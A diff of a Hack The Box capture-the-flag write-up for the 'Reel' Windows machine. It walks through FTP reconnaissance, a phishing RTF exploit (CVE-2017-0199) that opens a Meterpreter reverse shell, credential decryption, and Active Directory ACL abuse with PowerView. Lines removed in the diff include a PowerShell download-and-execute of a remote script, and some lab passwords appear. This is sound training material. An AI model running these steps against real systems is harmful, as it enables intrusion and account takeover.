@@ -7,31 +7,44 @@ tags:
   - activedirectory
   - pentest
   - writeup
+  - phishing
+  - applocker
 ---
 
 ---
 
 {% include toc icon="cog" title="Reel Solution" %}
 
-The [Reel](https://app.hackthebox.com/machines/Reel) machine has been created by [egre55](https://app.hackthebox.com/users/1190). This is an hard Windows Machine with a strong focus on Active Directory exploitation.
+The [Reel](https://app.hackthebox.com/machines/Reel) machine has been created by [egre55](https://app.hackthebox.com/users/1190). This is an **hard** Windows Machine with a strong focus on Active Directory exploitation. This box was fun, it was nice to finally have a phishing part as well as a small DACL abuse attack chain.
 {: .text-justify}
+
+If you didn't solve this challenge and just look for answers, first you should take a look at this [mind map](https://github.com/Orange-Cyberdefense/arsenal/blob/master/mindmap/pentest_ad_dark.png?raw=true) from [Orange Cyberdefense](https://github.com/Orange-Cyberdefense) and try again. It could give you some hints for attack paths when dealing with an Active Directory.
 
 ![image-center](/images/htb/htb_reel_infocard.png){: .align-center}
 
 **Note:** All the actions performed against the target machine have been done with a standard *Kali Linux* machine. You can download Kali from the official website [here](https://www.kali.org/).
 {: .notice--info}
 
+# Reconnaissance
+
+In a penetration test or red team, reconnaissance consists of techniques that involve adversaries actively or passively gathering information that can be used to support targeting. 
+
+This information can then be leveraged by an adversary to aid in other phases of the adversary lifecycle, such as using gathered information to plan and execute initial access, to scope and prioritize post-compromise objectives, or to drive and lead further reconnaissance efforts. Here, our only piece of information is an IP address. 
+
+## Scan with Nmap
+
+Let's start with a classic service scan with [Nmap](https://nmap.org/) in order to reveal some of the ports open on the machine.
 
 ```bash
-$ nmap -sV -Pn 10.129.155.236
+$ nmap -sV -Pn 10.129.147.8
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-11 11:18 EST
-Nmap scan report for 10.129.155.236
+Nmap scan report for 10.129.147.8
 Host is up (0.020s latency).
 Not shown: 992 filtered tcp ports (no-response)
 PORT      STATE SERVICE      VERSION
 21/tcp    open  ftp          Microsoft ftpd
 22/tcp    open  ssh          OpenSSH 7.6 (protocol 2.0)
-25/tcp    open  smtp?
+25/tcp    open  smtp
 135/tcp   open  msrpc        Microsoft Windows RPC
 139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
 445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: HTB)
@@ -43,11 +56,33 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 171.76 seconds
 ```
 
+We have a few interesting ports, including SSH (TCP/22), FTP (TCP/21) and SMTP (TCP/25). Let's dig a bit more.
+
+## Anonymous FTP
+
+After playing around with Nmap scripts, we found an [anonymous FTP](https://datatracker.ietf.org/doc/html/rfc1635) access.
+
 ```bash
-$ ftp 10.129.155.236
-Connected to 10.129.155.236.
+$ nmap -p 21 --script=ftp-anon -Pn 10.129.147.8
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-04 09:43 EDT
+Nmap scan report for 10.129.147.8
+Host is up (0.015s latency).
+
+PORT   STATE SERVICE
+21/tcp open  ftp
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_05-29-18  12:19AM       <DIR>          documents
+
+Nmap done: 1 IP address (1 host up) scanned in 0.38 seconds
+```
+
+Here, it seems that we have an anonymous access to the FTP server. An anonymous account accepts any string as a password and has limited access rights to an FTP server, but enough to be able to retrieve content.
+
+```bash
+$ ftp 10.129.147.8
+Connected to 10.129.147.8.
 220 Microsoft FTP Service
-Name (10.129.155.236:ax): anonymous
+Name (10.129.147.8:ax): anonymous
 331 Anonymous access allowed, send identity (e-mail name) as password.
 Password: 
 230 User logged in.
@@ -69,6 +104,8 @@ ftp> dir
 ftp> 
 ```
 
+Here, we found a bunch of documents on the FTP. Let's start with the **readme.txt** file.
+
 ```bash
 $ cat readme.txt         
 please email me any rtf format procedures - I'll review and convert.
@@ -76,11 +113,17 @@ please email me any rtf format procedures - I'll review and convert.
 new format / converted documents will be saved here.   
 ```
 
-AppLocker.docx contain
+It talks about sending RTF documents via email. In our context, it could make sense given the machine has its SMTP (TCP/25) port open. So we will probably need to send an email at some point. 
+
+Now, let's check **AppLocker.docx**. It contains the following text:
 
 ```text
 AppLocker procedure to be documented - hash rules for exe, msi and scripts (ps1,vbs,cmd,bat,js) are in effect.
 ```
+
+It seems the target computer have some [AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/applocker-overview) rules in place, we may need to use a specific bypass later.
+
+For the last document, **WindowsEventForwarding.docx**, we didn't find anything interesting in it. However, using [exiftool](https://exiftool.org), a metadata reader, we were able to extract an email address.
 
 ```bash
 $ exiftool WindowsEventForwarding.docx 
@@ -88,20 +131,9 @@ ExifTool Version Number         : 12.39
 File Name                       : WindowsEventForwarding.docx
 Directory                       : .
 File Size                       : 14 KiB
-File Modification Date/Time     : 2017:10:31 17:13:23-04:00
-File Access Date/Time           : 2022:02:11 11:31:56-05:00
-File Inode Change Date/Time     : 2022:02:11 11:31:44-05:00
-File Permissions                : -rw-r--r--
-File Type                       : DOCX
-File Type Extension             : docx
-MIME Type                       : application/vnd.openxmlformats-officedocument.wordprocessingml.document
-Zip Required Version            : 20
-Zip Bit Flag                    : 0x0006
-Zip Compression                 : Deflated
-Zip Modify Date                 : 1980:01:01 00:00:00
-Zip CRC                         : 0x82872409
-Zip Compressed Size             : 385
-Zip Uncompressed Size           : 1422
+
+...[snipe]...
+
 Zip File Name                   : [Content_Types].xml
 Creator                         : nico@megabank.com
 Revision Number                 : 4
@@ -113,6 +145,17 @@ Pages                           : 2
 Words                           : 299
 ```
 
+Here, it seems that our initial foothold will involve a phishing email that is able to bypass some AppLocker rules.
+
+# Initial Access
+
+According to the [MITRE](https://attack.mitre.org/techniques/T1566/), adversaries may send victims emails containing malicious attachments or links, typically to execute malicious code on victim systems. 
+
+## CVE-2017-0199
+
+As we need to send an RTF file, it seemed pretty obvious to start with the [CVE-2017-0199](https://www.mandiant.com/resources/cve-2017-0199-hta-handler) exploit, named [office_word_hta](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/windows/fileformat/office_word_hta.md) in Metasploit. This module creates a malicious RTF file that when opened in vulnerable versions of Microsoft Word will lead to code execution.
+
+Let's configure this module with Metasploit.
 
 ```bash
 msf6 exploit(windows/fileformat/office_word_hta) > show options 
@@ -121,8 +164,8 @@ Module options (exploit/windows/fileformat/office_word_hta):
 
    Name      Current Setting  Required  Description
    ----      ---------------  --------  -----------
-   FILENAME  msf.doc          yes       The file name.
-   SRVHOST   10.10.14.97      yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+   FILENAME  hello.rtf        yes       The file name.
+   SRVHOST   10.10.14.20      yes       The local host or network interface to listen on.
    SRVPORT   8080             yes       The local port to listen on.
    SSL       false            no        Negotiate SSL for incoming connections
    SSLCert                    no        Path to a custom SSL certificate (default is randomly generated)
@@ -135,7 +178,7 @@ Payload options (windows/meterpreter/reverse_tcp):
    ----      ---------------  --------  -----------
    EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
    LHOST     tun0             yes       The listen address (an interface may be specified)
-   LPORT     4444             yes       The listen port
+   LPORT     443              yes       The listen port
 
 
 Exploit target:
@@ -143,21 +186,29 @@ Exploit target:
    Id  Name
    --  ----
    0   Microsoft Office Word
-
-msf6 exploit(windows/fileformat/office_word_hta) > exploit
-[*] Exploit running as background job 0.
-[*] Exploit completed, but no session was created.
-
-[*] Started reverse TCP handler on 10.10.14.97:4444 
-[+] hello.rtf stored at /root/.msf4/local/hello.rtf
 ```
 
+Now, we just need to enter the `exploit` command to generate the malicious file and start the listener.
+
 ```bash
-$ sudo swaks --to nico@megabank.com --server 10.129.155.236 --attach /root/.msf4/local/hello.rtf
+msf6 exploit(windows/fileformat/office_word_hta) > exploit 
+[*] Exploit running as background job 1.
+[*] Exploit completed, but no session was created.
+
+[*] Started reverse TCP handler on 10.10.14.xx:443 
+[+] hello.rtf stored at /root/.msf4/local/hello.rtf
+[*] Using URL: http://10.10.14.xx:8080/default.hta
+[*] Server started.
+```
+
+Note that our malicious file is stored in **/root/.msf4/local/hello.rtf**. Now, using [swaks](http://www.jetmore.org/john/code/swaks/), an SMTP test tool, we can send our payload to **nico@megabank.com**.
+
+```bash
+$ sudo swaks --to nico@megabank.com --server 10.129.147.8 --attach /root/.msf4/local/hello.rtf
 [sudo] password for ax: 
 *** DEPRECATION WARNING: Inferring a filename from the argument to --attach will be removed in the future.  Prefix filenames with '@' instead.
-=== Trying 10.129.155.236:25...
-=== Connected to 10.129.155.236.
+=== Trying 10.129.147.8:25...
+=== Connected to 10.129.147.8.
 <-  220 Mail Service ready
  -> EHLO nms
 <-  250-REEL
@@ -177,13 +228,20 @@ $ sudo swaks --to nico@megabank.com --server 10.129.155.236 --attach /root/.msf4
 
 ...[snip]...
 
+ -> 
+ -> .
+<-  250 Queued (12.109 seconds)
+ -> QUIT
+<-  221 goodbye
+=== Connection closed with remote host.
 ```
 
+After waiting a few seconds, we should get a remote shell on the target machine.
+
 ```bash
-msf6 exploit(windows/fileformat/office_word_hta) > [*] Using URL: http://10.10.14.97:8080/default.hta
-[*] Server started.
-[*] Sending stage (175174 bytes) to 10.129.155.236
-[*] Meterpreter session 1 opened (10.10.14.97:4444 -> 10.129.155.236:49937 ) at 2022-02-11 15:12:55 -0500
+msf6 exploit(windows/fileformat/office_word_hta) > 
+[*] Sending stage (175174 bytes) to 10.129.147.8
+[*] Meterpreter session 1 opened (10.10.14.20:443 -> 10.129.147.8:49509) at 2022-06-04 10:20:04 -0400
 
 msf6 exploit(windows/fileformat/office_word_hta) > sessions -i 1
 [*] Starting interaction with 1...
@@ -196,10 +254,17 @@ System Language : en_GB
 Domain          : HTB
 Logged On Users : 6
 Meterpreter     : x86/windows
-meterpreter > getuid
-Server username: HTB\nico
-meterpreter > 
 ```
+
+Nice, we now have a remote shell and our **first flag**.
+
+# Privileges Escalation
+
+Privilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities.
+
+## Reading Creds
+
+Looking around nico's **Desktop** folder, we found a file named **cred.xml**.
 
 ```bash
 meterpreter > ls C:\\Users\\nico\\Desktop
@@ -212,8 +277,11 @@ Mode              Size  Type  Last modified              Name
 100666/rw-rw-rw-  282   fil   2017-10-27 18:42:45 -0400  desktop.ini
 100444/r--r--r--  32    fil   2017-10-27 19:40:33 -0400  user.txt
 100666/rw-rw-rw-  162   fil   2017-10-27 17:34:38 -0400  ~$iledDeliveryNotification.doc
+```
 
-meterpreter > cat C:\\Users\\nico\\Desktop\\cred.xml
+The file contains a **PSCredential** object with an encrypted password for **Tom**.
+
+```xml
 <Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
   <Obj RefId="0">
     <TN RefId="0">
@@ -227,10 +295,9 @@ meterpreter > cat C:\\Users\\nico\\Desktop\\cred.xml
     </Props>
   </Obj>
 </Objs>
-meterpreter > 
 ```
 
-https://mcpmag.com/articles/2017/07/20/save-and-read-sensitive-data-with-powershell.aspx
+Thanks to PowerShell we can [easily](https://mcpmag.com/articles/2017/07/20/save-and-read-sensitive-data-with-powershell.aspx) retrieve the cleartext password.
 
 ```bash
 meterpreter > load powershell 
@@ -242,9 +309,11 @@ PS > $credential.GetNetworkCredential().Password
 PS > 
 ```
 
+We didn't get any access using WinRM/SMB with these credentials, however, the remote machine does have an SSH (TCP/22) server running.
+
 ```
-$ ssh tom@10.129.155.236   
-tom@10.129.155.236's password: 
+$ ssh tom@10.129.147.8   
+tom@10.129.147.8's password: 
 
 
 Microsoft Windows [Version 6.3.9600]                                                                                            
@@ -252,6 +321,12 @@ Microsoft Windows [Version 6.3.9600]
 
 tom@REEL C:\Users\tom> 
 ```
+
+Nice, we have access to the remote machine through SSH.
+
+## ACL Abuse
+
+Digging through Tom's folders, we found some files related to BloodHound, including the result of a previous scan.
 
 ```bash
 tom@REEL C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors>dir                                                                 
@@ -271,6 +346,8 @@ tom@REEL C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors>dir
                2 Dir(s)  15,741,628,416 bytes free                                                                              
 ```
 
+The **acls.csv** file contains ACL related to the domain. We can easily grep some interesting data manually with PowerShell. Let's start with **tom**
+
 ```bash
 tom@REEL C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors>powershell        
 
@@ -281,13 +358,8 @@ PS C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors> Get-Content .\acls.csv | 
 "claire@HTB.LOCAL","USER","","tom@HTB.LOCAL","USER","WriteOwner","","AccessAllowed","False"                                     
 ```
 
-```bash
-PS C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors> Get-Content .\acls.csv | Select-String -Pattern nico                     
+Here we can see that, **tom** has the *WriteOwner* permission over **claire** which means we can change the object owner to take over the object. Basically, we own **claire**. Let's see what this user can do.
 
-...[snip]...  
-
-"herman@HTB.LOCAL","USER","","nico@HTB.LOCAL","USER","WriteOwner","","AccessAllowed","False"                                    
-```
 
 ```bash
 PS C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors> Get-Content .\acls.csv | Select-String -Pattern claire                   
@@ -297,25 +369,9 @@ PS C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors> Get-Content .\acls.csv | 
 "Backup_Admins@HTB.LOCAL","GROUP","","claire@HTB.LOCAL","USER","WriteDacl","","AccessAllowed","False"                           
 ```
 
-```bash
-PS C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors> Get-Content .\acls.csv | Select-String -Pattern Backup_Admins            
+That's really interesting, **claire** has *WriteDacl* privileges over **Backup_Admins** which means we could modify object's ACEs and take over  **Backup_Admins**. For now, we don't really know what **Backup_Admins** can do, but we will see when we get there.
 
-"Backup_Admins@HTB.LOCAL","GROUP","","Exchange Windows                                                                          
-Permissions@HTB.LOCAL","GROUP","ExtendedRight","User-Force-Change-Password","AccessAllowed","False"                             
-"Backup_Admins@HTB.LOCAL","GROUP","","Exchange Windows                                                                          
-Permissions@HTB.LOCAL","GROUP","WriteProperty","Member","AccessAllowed","False"                                                 
-"Backup_Admins@HTB.LOCAL","GROUP","","Exchange Windows Permissions@HTB.LOCAL","GROUP","WriteDacl","","AccessAllowed","False"    
-"Backup_Admins@HTB.LOCAL","GROUP","","Exchange Windows Permissions@HTB.LOCAL","GROUP","WriteDacl","","AccessAllowed","False"    
-"Backup_Admins@HTB.LOCAL","GROUP","","Domain Admins@HTB.LOCAL","GROUP","GenericAll","","AccessAllowed","False"                  
-"Backup_Admins@HTB.LOCAL","GROUP","","claire@HTB.LOCAL","USER","WriteDacl","","AccessAllowed","False"                           
-"Backup_Admins@HTB.LOCAL","GROUP","","herman@HTB.LOCAL","USER","WriteDacl","","AccessAllowed","False"                           
-"Backup_Admins@HTB.LOCAL","GROUP","","julia@HTB.LOCAL","USER","WriteDacl","","AccessAllowed","False"                            
-"Backup_Admins@HTB.LOCAL","GROUP","","Enterprise Admins@HTB.LOCAL","GROUP","GenericAll","","AccessAllowed","False"              
-"Backup_Admins@HTB.LOCAL","GROUP","","Account Operators@HTB.LOCAL","GROUP","GenericAll","","AccessAllowed","False"              
-"Backup_Admins@HTB.LOCAL","GROUP","","Administrators@HTB.LOCAL","GROUP","WriteDacl WriteOwner","","AccessAllowed","False"       
-"Backup_Admins@HTB.LOCAL","GROUP","","Local System@HTB.LOCAL","USER","GenericAll","","AccessAllowed","False"                    
-"Backup_Admins@HTB.LOCAL","GROUP","","Domain Admins@HTB.LOCAL","GROUP","Owner","","AccessAllowed","False"                       
-```
+Let's abuse the *WriteOwner* permission **tom** has over **claire**. Here, we used the *PowerView.ps1* PowerShell script that was already present on the machine. As a reminder, [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) is a tool that helps to gain network situational awareness on Windows domains, but it also has some interesting functionality.
 
 ```bash
 PS C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors> cd .. 
@@ -332,6 +388,10 @@ d----         5/29/2018   8:57 PM            Ingestors
 
 ```
 
+Here, the *PowerView.ps1* module is imported in our PowerShell session. Using [Set-DomainObjectOwner](https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainObjectOwner/) we can modify the owner of **claire** and set it to **tom**. Given we have full control over **claire**, we can use the [Add-DomainObjectAc](https://powersploit.readthedocs.io/en/latest/Recon/Add-DomainObjectAcl/) command to allow **tom** to reset claire's password.
+
+Finally, we can use the [Set-DomainUserPassword](https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainUserPassword/) command to modify claire's password.
+
 ```bash
 PS C:\Users\tom\Desktop\AD Audit\BloodHound> Import-Module .\PowerView.ps1
 PS C:\Users\tom\Desktop\AD Audit\BloodHound> Set-DomainObjectOwner -Identity claire -OwnerIdentity tom
@@ -340,16 +400,23 @@ PS C:\Users\tom\Desktop\AD Audit\BloodHound> $creds = ConvertTo-SecureString 'Qw
 PS C:\Users\tom\Desktop\AD Audit\BloodHound> Set-DomainUserPassword -identity claire -accountpassword $creds -Verbose           
 VERBOSE: [Set-DomainUserPassword] Attempting to set the password for user 'claire'                                              
 VERBOSE: [Set-DomainUserPassword] Password for user 'claire' successfully reset   
-
 ```
 
+Let's sse if we can get an SSH access with **claire** domain account.
+
 ```bash
-$ ssh claire@10.129.155.236
-claire@10.129.155.236's password: 
+$ ssh claire@10.129.147.8
+claire@10.129.147.8's password: 
 
 Microsoft Windows [Version 6.3.9600]                                                                                            
-(c) 2013 Microsoft Corporation. All rights reserved.                                                                            
+(c) 2013 Microsoft Corporation. All rights reserved.     
 
+claire@REEL C:\Users\claire>
+```
+
+Yep ! Now, since **claire** has *WriteDacl* privileges over **Backup_Admins**, we can add our account to this group.
+
+```bash
 claire@REEL C:\Users\claire>net group backup_admins claire /add                                                                  
 The command completed successfully.                                                                                             
 
@@ -362,48 +429,36 @@ Members
 -------------------------------------------------------------------------------                                                 
 claire                   ranj                                                                                                   
 The command completed successfully.                 
-
 ```
 
+Done and done.
 
-claire@REEL C:\Users\claire>powershell                                                                                          
-Windows PowerShell                                                                                                              
-Copyright (C) 2014 Microsoft Corporation. All rights reserved.                                                                  
+## Getting the admin password
 
-PS C:\Users\claire> IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.97/PrivescCheck.ps1'); Invoke-PrivescCheck -Extended                                                                                                     
+After some unsuccessful escalation paths, we found something interesting. Being a member of the **Backup_Admins** group give us full (F) access over the *C:\Users\Administrator* folder.
 
+Note that we used the [icacls](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls) command to display discretionary access control lists (DACLs) on the specified folder.
 
-+------+------------------------------------------------+------+                                                                
-| TEST | CREDS > WinLogon                               | VULN |                                                                
-+------+------------------------------------------------+------+                                                                
-| DESC | Parse the Winlogon registry keys and check whether    |                                                                
-|      | they contain any clear-text password. Entries that    |                                                                
-|      | have an empty password field are filtered out.        |                                                                
-+------+-------------------------------------------------------+                                                                
-[*] Found 1 result(s).                                                                                                          
+```bash
+claire@REEL C:\Users>icacls Administrator
+Administrator NT AUTHORITY\SYSTEM:(OI)(CI)(F)
+              HTB\Backup_Admins:(OI)(CI)(F)
+              HTB\Administrator:(OI)(CI)(F)
+              BUILTIN\Administrators:(OI)(CI)(F)
 
+Successfully processed 1 files; Failed processing 0 files
+```
 
-Domain   : HTB                                                                                                                  
-Username : nico                                                                                                                 
-Password : 4dri@na2017!**                                                                                                       
+Cool, we should be able to read the *root.txt* file.
 
-
-PS C:\Users\administrator> net group backup_admins claire /add                                                                  
-The command completed successfully.                                                                                             
-
-PS C:\Users\administrator> net group backup_admins                                                                              
-Group name     Backup_Admins                                                                                                    
-Comment                                                                                                                         
-
-Members                                                                                                                         
-
--------------------------------------------------------------------------------                                                 
-claire                   ranj                                                                                                   
-The command completed successfully.                 
-
+```bash
 claire@REEL c:\Users\Administrator\Desktop>type root.txt                                                                        
 Access is denied.                                                                                                               
+```
 
+Or not. We may be missing some privileges... However, we have access to another folder, **Backup Scripts**.
+
+```bash
 claire@REEL c:\Users\Administrator\Desktop>cd "Backup Scripts"                                                                  
 
 claire@REEL c:\Users\Administrator\Desktop\Backup Scripts>dir                                                                   
@@ -422,21 +477,28 @@ claire@REEL c:\Users\Administrator\Desktop\Backup Scripts>dir
 11/03/2017  11:22 PM               308 test2.ps1.txt                                                                            
                6 File(s)         11,903 bytes                                                                                   
                2 Dir(s)  15,738,982,400 bytes free                                                                              
+```
 
+The folder contains multiple scripts and one of them had interesting information in it.
+
+```bash
 claire@REEL c:\Users\Administrator\Desktop\Backup Scripts>type BackupScript.ps1                                                 
 # admin password                                                                                                                
 $password="Cr4ckMeIfYouC4n!"                                                                                                    
 
 #Variables, only Change here                                                                                                    
 $Destination="\\BACKUP03\BACKUP" #Copy the Files to this Location            
+```
 
+Let's see if this password works with the **administrator** account.
 
-
-
+```bash
+$ ssh administrator@10.129.147.8
+administrator@10.129.147.8's password: 
 Microsoft Windows [Version 6.3.9600]                                                                                            
 (c) 2013 Microsoft Corporation. All rights reserved.                                                                            
 
-administrator@REEL C:\Users\Administrator>cd Desktop                                                                            
+administrator@REEL C:\Users\Administrator>                                                                          
 
 administrator@REEL C:\Users\Administrator\Desktop>ls                                                                            
 'ls' is not recognized as an internal or external command,                                                                      
@@ -454,7 +516,8 @@ administrator@REEL C:\Users\Administrator\Desktop>dir
 28/10/2017  11:56                32 root.txt                                                                                    
                1 File(s)             32 bytes                                                                                   
                3 Dir(s)  15,738,458,112 bytes free                                                                              
+```
 
-administrator@REEL C:\Users\Administrator\Desktop>type root.txt                                                                 
-1018a0331e686176ff4577c728eaf32a                                                                                                
-administrator@REEL C:\Users\Administrator\Desktop>     
+We now have access to the **second flag**.
+
+Awesome ! I hope you enjoyed it, I know I did :)
